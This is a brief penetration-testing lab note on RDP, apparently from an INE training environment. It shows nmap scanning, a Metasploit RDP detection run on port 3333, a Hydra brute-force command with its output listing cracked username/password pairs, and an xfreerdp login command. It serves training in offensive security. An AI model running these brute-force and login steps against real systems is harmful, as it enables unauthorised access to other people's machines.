Default port 3389
# Footprint
You can use nmap to see the port open
```bash
# nmap -sV -O demo.ine.local                                                                                                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 16:16 IST
Stats: 0:01:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for demo.ine.local (10.2.25.39)
Host is up (0.0027s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3333/tcp  open  ssl/dec-notes?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
...
Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.80 seconds
```
You can see that the port 3333 is open, lets see if RDP is running on this port.
# Check RDP on a port
To check if a port run RDP, use the `auxiliary/scanner/rdp/rdp_scanner` module
```bash
msf6 > use auxiliary/scanner/rdp/rdp_scanner
msf6 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS <IP>
RHOSTS => 10.2.25.39
msf6 auxiliary(scanner/rdp/rdp_scanner) > set RPORT 3333
RPORT => 3333
msf6 auxiliary(scanner/rdp/rdp_scanner) > run

[*] 10.2.25.39:3333       - Detected RDP on 10.2.25.39:3333       (name:WIN-OMCNBKR66MN) (domain:WIN-OMCNBKR66MN) (domain_fqdn:WIN-OMCNBKR66MN) (server_fqdn:WIN-OMCNBKR66MN) (os_version:6.3.9600) (Requires NLA: Yes)
[*] 10.2.25.39:3333       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
# Bruteforce
## Hydra
```bash
$> hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<TARGET_IP> -s <PORT> 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-08 16:22:33
[WARNING] rdp servers often don\'t like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 700 login tries (l:7/p:100), ~175 tries per task
[DATA] attacking rdp://demo.ine.local:3333/
[3333][rdp] host: demo.ine.local   login: sysadmin   password: samantha
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: demo.ine.local   login: demo   password: victoria
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: demo.ine.local   login: auditor   password: elizabeth
[ERROR] freerdp: The connection failed to establish.
[STATUS] 404.00 tries/min, 404 tries in 00:01h, 296 to do in 00:01h, 4 active
[3333][rdp] host: demo.ine.local   login: administrator   password: qwertyuiop
[ERROR] freerdp: The connection failed to establish.
[STATUS] 335.50 tries/min, 671 tries in 00:02h, 29 to do in 00:01h, 4 active
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-08 16:24:43
```
# Connect to RDP
```bash
$> xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<IP>:<PORT>
```